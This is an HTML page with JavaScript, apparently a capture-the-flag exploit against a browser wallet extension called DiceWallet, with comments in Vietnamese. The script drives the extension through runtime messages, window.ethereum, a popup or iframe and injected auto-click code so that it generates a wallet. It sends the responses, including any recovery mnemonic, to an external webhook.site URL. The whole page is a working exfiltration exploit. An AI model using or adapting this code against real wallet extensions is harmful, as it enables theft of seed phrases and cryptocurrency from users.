<!DOCTYPE html>
<html>
<head>
    <title>DiceWallet Exploit - Trigger Wallet Generation</title>
</head>
<body>
    <h1>DiceWallet Exploit</h1>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://a01e28d1-26bd-4236-b3de-72d0a426ca16.webhook.site';
        const EXTENSION_ID = '21b5b501-df4f-40e1-b698-e392f9fcbe7a';
        
        function log(msg) {
            document.getElementById('status').innerHTML += '<br>' + msg;
            console.log(msg);
        }
        
        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {
                new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
            });
        }
        
        async function triggerWalletGeneration() {
            log('1. Attempting to trigger wallet generation...');
            
            // CÁCH 1: Gửi message trực tiếp đến background
            try {
                log('Sending DICE_POPUP generate message...');
                const response = await chrome.runtime.sendMessage(EXTENSION_ID, {
                    type: 'DICE_POPUP',
                    action: 'generate'
                });
                
                log('✅ Generate response:', response);
                sendToWebhook({
                    type: 'generate_response',
                    response
                });
                
                // Nếu có mnemonic
                if (response && response.mnemonic) {
                    log('🎯 Got mnemonic:', response.mnemonic);
                    
                    // Gửi flag
                    const flagRes = await fetch('/flag', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ mnemonic: response.mnemonic })
                    });
                    
                    const flagData = await flagRes.json();
                    if (flagData.flag) {
                        log(`🏁 FLAG: ${flagData.flag}`);
                    }
                }
                
            } catch (e) {
                log('❌ Generate failed:', e.message);
            }
            
            // CÁCH 2: Thử action addAccount
            try {
                log('Sending DICE_POPUP addAccount message...');
                const response = await chrome.runtime.sendMessage(EXTENSION_ID, {
                    type: 'DICE_POPUP',
                    action: 'addAccount'
                });
                
                log('✅ addAccount response:', response);
                sendToWebhook({
                    type: 'addAccount_response',
                    response
                });
                
            } catch (e) {
                log('❌ addAccount failed:', e.message);
            }
            
            // CÁCH 3: Thử qua window.ethereum
            if (window.ethereum) {
                try {
                    log('Calling wallet_generate via ethereum...');
                    const result = await window.ethereum.request({
                        method: 'wallet_generate'
                    });
                    
                    log('✅ wallet_generate:', result);
                    sendToWebhook({
                        type: 'wallet_generate',
                        result
                    });
                    
                } catch (e) {
                    log('❌ wallet_generate failed:', e.message);
                }
            }
            
            // CÁCH 4: Mở popup và tự động click
            log('2. Opening popup to trigger manually...');
            
            const popupUrl = `moz-extension://${EXTENSION_ID}/popup.html#/onboard`;
            const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
            
            if (!popup) {
                log('Popup blocked - trying iframe');
                const iframe = document.createElement('iframe');
                iframe.src = popupUrl;
                iframe.style.width = '400px';
                iframe.style.height = '600px';
                iframe.style.position = 'fixed';
                iframe.style.top = '10px';
                iframe.style.right = '10px';
                iframe.style.zIndex = '9999';
                document.body.appendChild(iframe);
            }
            
            // CÁCH 5: Inject script vào popup nếu có thể
            setTimeout(() => {
                log('3. Attempting to auto-click in popup...');
                
                // Gửi message đến tất cả các tab
                chrome.runtime.sendMessage(EXTENSION_ID, {
                    type: 'DICE_POPUP',
                    action: 'inject',
                    code: `
                        // Tự động click nút Create New Wallet
                        setTimeout(() => {
                            const btn = document.getElementById('btn-generate');
                            if (btn) {
                                btn.click();
                                console.log('Clicked generate button!');
                            }
                        }, 2000);
                    `
                });
            }, 3000);
        }
        
        // Start
        log('0. Starting exploit...');
        triggerWalletGeneration();
    </script>
</body>
</html>
